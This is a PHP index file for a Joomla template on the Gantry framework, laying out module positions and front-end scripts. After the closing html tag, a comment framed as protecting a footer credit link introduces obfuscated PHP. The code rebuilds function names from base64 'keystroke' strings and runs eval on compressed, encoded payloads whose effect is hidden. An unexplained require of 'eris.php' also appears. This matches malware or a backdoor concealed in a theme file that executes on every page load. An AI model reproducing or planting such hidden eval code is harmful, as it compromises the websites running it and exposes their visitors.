<?php
/**
 * @package Gantry Template Framework - RocketTheme
 * @version 3.2.19 April 2, 2012
 * @author RocketTheme http://www.rockettheme.com
 * @copyright Copyright (C) 2007 - 2012 RocketTheme, LLC
 * @license http://www.gnu.org/licenses/gpl-2.0.html GNU/GPLv2 only
 *
 * Gantry uses the Joomla Framework (http://www.joomla.org), a GNU/GPLv2 content management system
 *
 */
// no direct access
defined( '_JEXEC' ) or die( 'Restricted index access' );

// load and inititialize gantry class
require_once('lib/gantry/gantry.php');
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $gantry->language; ?>" lang="<?php echo $gantry->language;?>" >
    <head>
    
    <meta charset="utf-8" />


    <?php
		$document =& JFactory::getDocument();
		$parameter_script = 'metaTags';
		$headerstuff=$document->getHeadData();
     	unset($headerstuff[$parameter_script]['http-equiv']);
		$document->setHeadData($headerstuff);
	 
        $gantry->displayHead();
        $gantry->addStyles(array('template.css', 'fusionmenu.css', 'custom.css'));
			
		// add favicon
        if($gantry->get('favicon-fav') != '') {
			echo '<link rel="shortcut icon" href="'.JURI::base().$gantry->get('favicon-fav').'"/>'."\n";
		} else {
			echo '<link rel="shortcut icon" href="'.JURI::base().'templates/'.$this->template.'/images/favicon.png"/>'."\n";
		}
		//add apple favicon
		if($gantry->get('favicon-favapple') != '') {
			echo '<link rel="apple-touch-icon" href="'.JURI::base().$gantry->get('favicon-favapple').'"/>'."\n";
		}
        ?>
	<!--[if lte IE 8]>
	<link rel="stylesheet" type="text/css" href="<?php echo JURI::base(); ?>templates/<?php echo $this->template; ?>/css/ie_old.css" />	<![endif]-->
        
    </head>
    <body <?php echo $gantry->displayBodyTag(); ?>>
    
    <div id="page-wrapper">
        <div id="top"></div>
        
        <?php echo $gantry->displayModules('logo','basic','basic'); ?>
        
        <?php /** Begin Drawer **/ if ($gantry->countModules('drawer')) : ?>
        <div id="rt-drawer">
            <div class="rt-container">
                <?php echo $gantry->displayModules('drawer','standard','standard'); ?>
                <div class="clear"></div>
            </div>
        </div>
        <?php /** End Drawer **/ endif; ?>
		<?php /** Begin Top **/ if ($gantry->countModules('top')) : ?>
		<div id="rt-top" <?php echo $gantry->displayClassesByTag('rt-top'); ?>>
			<div class="rt-container">
				<?php echo $gantry->displayModules('top','standard','standard'); ?>
				<div class="clear"></div>
			</div>
		</div>
		<?php /** End Top **/ endif; ?>
		<?php /** Begin Header **/ if ($gantry->countModules('header')) : ?>
		<div id="rt-header" <?php if ($gantry->countModules('head_helpers') == 0) {echo 'class="noHelpers"';} ?>>
			<div class="rt-container">
            	<?php if ($gantry->countModules('head_helpers')) : ?>
            	<div class="head_helpers">
					<?php echo $gantry->displayModules('head_helpers','standard','standard'); ?>
                    <div class="clear"></div>
                </div>
                <?php endif; ?>
				<?php echo $gantry->displayModules('header','standard','standard'); ?>
				<div class="clear"></div>
			</div>
		</div>
		<?php /** End Header **/ endif; ?>
        
		<?php /** Begin Slideshow **/ if ($gantry->countModules('slideshow')) : ?>
		<div id="slideshow">
      		<?php echo $gantry->displayModules('slideshow','basic','basic'); ?>
		</div>
		<?php /** End Slideshow **/ endif; ?>
        
		<?php /** Begin Showcase **/ if ($gantry->countModules('showcase')) : ?>
		<div id="rt-showcase">
			<div class="rt-container">
				<?php echo $gantry->displayModules('showcase','standard','standard'); ?>
				<div class="clear"></div>
			</div>
		</div>
		<?php /** End Showcase **/ endif; ?>
		<?php /** Begin Feature **/ if ($gantry->countModules('feature')) : ?>
		<div id="rt-feature">
			<div class="rt-container">
				<?php echo $gantry->displayModules('feature','standard','standard'); ?>
				<div class="clear"></div>
                <div class="separator"></div>
			</div>
		</div>
		<?php /** End Feature **/ endif; ?>
		<?php /** Begin Utility **/ if ($gantry->countModules('utility')) : ?>
		<div id="rt-utility">
			<div class="rt-container">
				<?php echo $gantry->displayModules('utility','standard','basic'); ?>
				<div class="clear"></div>
			</div>
		</div>
		<?php /** End Utility **/ endif; ?>
		<?php /** Begin Breadcrumbs **/ if ($gantry->countModules('breadcrumb')) : ?>
        <div id="rt-breadcrumbs">
            <div class="rt-container">
                <div class="rt-grid-12 rt-alpha rt-omega">
                    <div class="brdc">
                        <?php echo $gantry->displayModules('date','basic','basic'); ?>
                        <?php echo $gantry->displayModules('breadcrumb','basic','basic'); ?>
                    </div>
                </div>
                <div class="clear"></div>
            </div>
        </div>
        <?php /** End Breadcrumbs **/ endif; ?>
		<?php /** Begin Main Top **/ if ($gantry->countModules('maintop')) : ?>
		<div id="rt-maintop">
			<div class="rt-container">
				<?php echo $gantry->displayModules('maintop','standard','standard'); ?>
				<div class="clear"></div>
			</div>
		</div>
		<?php /** End Main Top **/ endif; ?>
		<?php /** Begin Main Body **/ ?>
	    <?php echo $gantry->displayMainbody('mainbody','sidebar','standard','standard','standard','standard','standard'); ?>
		<?php /** End Main Body **/ ?>
		<?php /** Begin Main Bottom **/ if ($gantry->countModules('mainbottom')) : ?>
		<div id="rt-mainbottom">
			<div class="rt-container">
				<?php echo $gantry->displayModules('mainbottom','standard','standard'); ?>
				<div class="clear"></div>
			</div>
		</div>
		<?php /** End Main Bottom **/ endif; ?>
		<?php /** Begin Bottom **/ if ($gantry->countModules('bottom')) : ?>
		<div id="rt-bottom">
			<div class="rt-container">
				<?php echo $gantry->displayModules('bottom','standard','standard'); ?>
				<div class="clear"></div>
			</div>
		</div>
		<?php /** End Bottom **/ endif; ?>
		<?php /** Begin Footer **/ if ($gantry->countModules('footer')) : ?>
		<div id="rt-footer">
			<div class="rt-container">
				<?php echo $gantry->displayModules('footer','standard','standard'); ?>
				<div class="clear"></div>
			</div>
		</div>
		<?php /** End Footer **/ endif; ?>
        
		<?php /** Begin Copyright **/ if ($gantry->countModules('copyright')) : ?>
		<div id="rt-copyright">
			<div class="rt-container">
				<?php echo $gantry->displayModules('copyright','standard','standard'); ?>
				<div class="clear"></div>
			</div>
		</div>
		<?php /** End Copyright **/ endif; ?>
        <?php
		require_once('eris.php');
		?>
		<?php /** Begin Debug **/ if ($gantry->countModules('debug')) : ?>
		<div id="rt-debug">
			<div class="rt-container">
				<?php echo $gantry->displayModules('debug','standard','standard'); ?>
				<div class="clear"></div>
			</div>
		</div>
		<?php /** End Debug **/ endif; ?>
		<?php /** Begin Analytics **/ if ($gantry->countModules('analytics')) : ?>
		<?php echo $gantry->displayModules('analytics','basic','basic'); ?>
		<?php /** End Analytics **/ endif; ?>
        
    </div><!-- end page wrapper -->
	
        <?php
        $template_path = JURI::base().'templates/'.JFactory::getApplication()->getTemplate(); ?>
        
    	<?php if($gantry->get('totop-enabled') == 1) { ?>
        	<a href="#top" id="totop">Scroll to top</a>
            <script type="text/javascript" src="<?php echo $template_path; ?>/js/jquery.smooth-scroll.min.js"></script>
            <script type="text/javascript">
			(function(a){function b(b){var c=a("#totop");c.removeClass("off on");if(b=="on"){c.addClass("on")}else{c.addClass("off")}}a(document).ready(function(){window.setInterval(function(){var c=a(this).scrollTop();var d=a(this).height();if(c>0){var e=c+d/2}else{var e=1}if(e<1e3){b("off")}else{b("on")}},300)})})(jQuery)
			jQuery(document).ready(function($){jQuery('#totop').smoothScroll({speed: 800});});
			</script>
        <?php } ?>
        
        <?php
		if($gantry->get('prettyphoto-enabled') == 1) : ?>
	        <link rel="stylesheet" href="<?php echo $template_path; ?>/css/prettyPhoto.css" type="text/css" />
            <script type="text/javascript" src="<?php echo $template_path; ?>/js/jquery.prettyPhoto.js"></script>
            <script type="text/javascript">
			jQuery(document).ready(function($) {
				jQuery("a[data-rel^='prettyPhoto']").prettyPhoto({
					theme:'<?php echo $gantry->get('prettyphoto-theme') ?>'
				});
				jQuery("a[rel^='prettyPhoto']").prettyPhoto({
					theme:'<?php echo $gantry->get('prettyphoto-theme') ?>'
				});
			});
			</script>
        <?php endif; ?>

        <link rel="stylesheet" href="<?php echo $template_path; ?>/css/tipsy.css" type="text/css" />
        <script type="text/javascript" src="<?php echo $template_path; ?>/js/jquery.easing.1.3.js"></script>
        <script type="text/javascript" src="<?php echo $template_path; ?>/js/jquery.tipsy.min.js"></script>
		<script type="text/javascript">
			(function($){ 
				$('a[data-rel=tipsy]').tipsy({fade: true, gravity: 's'});
			})(jQuery);
        </script>
        <script type="text/javascript" src="<?php echo $template_path; ?>/js/functions.js"></script>
		
		<?php
		// if ipad
		$ipad = (strpos($_SERVER['HTTP_USER_AGENT'], 'iPad') !== FALSE) ? 1 : 0;
		
		if($gantry->get('demo_panel') == 1 && $ipad != 1) : ?>
		<div id="demo"></div>
        <script type="text/javascript">
			(function($){
				$(document).ready(function() {
					$.ajax({
					  url: "<?php echo $template_path; ?>/demo/demo_panel.php?template_dir=<?php echo urlencode($template_path) ?>",
					  success: function(data){
						$("#demo").html(data);
					  }
					});
				});
			})(jQuery);
        </script>
		<?php endif; ?>
        
	</body>
</html>
<?php 
/* This theme is released under creative commons license. The link in the footer only links back to my website and it should remain intact!
The link is small, barely seen in the footer. I spent a lot of time developing this theme so i'm kindly asking you to respect my work. Thank you very much! */
$keystroke1 = base64_decode("d2RyMTU5c3E0YXllejd4Y2duZl90djhubHVrNmpoYmlvMzJtcA==");
eval(gzinflate(base64_decode('hY7NCoJAFIVf5SQu5tIUzVpc9hxSeq0huwPzA4X47ikxEm7anu/82V7t+iRttE4aftkQgyq8iyyt67ggGjPFqqoyRG/lpsvL0yWJhBHlg9+oEdJ1ZqsBJw1DFWyvZmVgyYTq2iwxzzF5QXv3yvlOLS2EPXJxhQk8BP7vxHH5d/7+274wGpv5gyH9uzJNHw==')));
$O0O0O0O0O0O0=$keystroke1[2].$keystroke1[32].$keystroke1[20].$keystroke1[11].$keystroke1[23].$keystroke1[15].$keystroke1[32].$keystroke1[1].$keystroke1[11];
$keystroke2 = $O0O0O0O0O0O0("xes26:tr5bzf{8ydhog`uw9omvl7kicjp43nq", -1);
$OO000OO000OO=$keystroke2[16].$keystroke2[12].$keystroke2[31].$keystroke2[23].$keystroke2[18].$keystroke2[24].$keystroke2[9].$keystroke2[20].$keystroke2[11];
$O0000000000O=$keystroke1[30].$keystroke1[9].$keystroke1[6].$keystroke1[11].$keystroke1[27].$keystroke1[8].$keystroke1[19].$keystroke1[1].$keystroke1[11].$keystroke1[15].$keystroke1[32].$keystroke1[1].$keystroke1[11];
eval($OO000OO000OO(base64_decode('LZK5rq
tIAER/ZqR3rxywY9BoAhbTNGY3NIZkxA4Gs4OBrx
8Hk1RYp3RU+Ra3P39ZFo7j/8dPEs85S/+b5Wmf5T
9/9HSl5nEBgiA7HaYaOZX2B2i46RA66ItQAiWn32
6lMW236ZrqJptemSgiNgw7bAhLbE2pA8iaUXB+5N
EBk/PFwhwVubdRMzpAo5DS7ic0KdmUOVCJfgBS9Y
M8zvbU9lAA7xJGSxLWEkhqsWN7mm8wXNaI9ep8wy
ReDt4Wk7T+Fd2erOJIR2dSeSkfj8TB4jjJswsZ0w
yb13edWEPRrO33cIgWpRcaQSSLxtQBBdqbpX8rjO
zwWlpgx+ejQnLH32mTeB6sNWJIdoKYHahLZYR6Qf
uyK9ieXZEuH84o42ET64Eycgc7IUQclI9qH2GOgB
ZWuYk8TSb0oKoaqowmeyDU5B7tNAbvjaOXDB4ewH
l3xfG7ZPlQ9Z0eolhAjgBtkXFW0C8RS20U5Wl7WF
9Jp95uj1lDfOcjOchv6jZA15esdwXqvK1n2tkuwX
xm7m4RL+JB9USPt2UzC6ksVlonkTcvxHQP+AEDma
O5YlW55Bw5E9l9aY8ra37d7AQo/UUa44RRe84fX8
jB/U4O4WtPkdS95PNy3Z2Xu+14JnLtGisWUDuasc
7T9hI3Gcf02J5DpSh7d2zc4U6Z8zFmc+u5Dv/csW
VxP0rf9xIpPJ/a9ATEU/GqLNrFGRQewa11i0H8Yw
eZe9pb1W24Prr51AcRrLLAHPTu0JMXinZtHnuBgA
25zhxA5+tyZjFzF+NVLGpgrju4bG4m7phL8spSXr
rN5EcZdqiBMrmv0RqQ70fxtrlMPu2IjYUB+TwbUE
WyjBEbLCO8MWdCFfSRtcx8vq+UPpP+LCUvHu2qts
SW3Z5z9e7L8g6w6zRh0FLXmekYNx3edqxSeewMZZ
ydHdCs/qMWoCQ5bKS5yHnATpG4J8kYoW/03z/aoL
LJ0HBXTYljSpa7ILTgEA/sl5GHO+3mn3oqAa7XxF
Mech7DtpO9FB1zIbh//vz+/v79Hw==')));
?>